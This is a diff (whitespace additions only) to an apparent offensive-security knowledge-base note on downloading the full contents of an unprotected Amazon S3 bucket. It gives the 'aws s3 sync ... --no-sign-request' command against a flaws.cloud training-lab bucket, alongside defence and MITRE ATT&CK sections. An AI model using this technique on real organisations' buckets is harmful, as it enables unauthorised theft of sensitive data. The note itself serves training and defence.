@@ -35,11 +35,15 @@ This procedure uses the AWS CLI to download all files from the S3 bucket. The AW
 
 The business value of this procedure is that it allows an attacker to steal sensitive data from an organization's S3 bucket. This can result in financial loss, reputational damage, and legal liability for the organization.
 
+ 
+
 ## Requirements
 
 1. Access to AWS CLI
 
 1. Access to an Amazon S3 bucket
+
+ 
 
 ## Defense
 
@@ -49,11 +53,15 @@ The business value of this procedure is that it allows an attacker to steal sens
 
 1. Monitor S3 bucket activity for suspicious behavior
 
+ 
+
 ## Objectives
 
 1. Download all files from an Amazon S3 bucket
 
 1. Steal sensitive data from an organization's S3 bucket
+
+ 
 
 # Instructions
 
@@ -61,15 +69,25 @@ The business value of this procedure is that it allows an attacker to steal sens
 2. Install AWS CLI
 3. Run the following command: aws s3 sync s3://<bucket_name>/ . --no-sign-request --region <region_name>
 
+ 
+
+
+
 **Code**: [[aws s3 sync s3://level3-9afd3927f195e10225021a578e]]
 
+
+
 > This command uses the AWS CLI to download all files from the specified S3 bucket. The --no-sign-request option is used to bypass authentication. The --region option specifies the region where the S3 bucket is located.
+
+
 
 **Command** ([[Sync S3 bucket content to local directory]]):
 
 ```bash
 aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ . --no-sign-request --region us-west-2
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -90,3 +108,5 @@ aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ . --no-sig
 - [[Amazon Bucket S3 AWS]]
 - [[Basic tests]]
 - [[Download every things]]
+
+
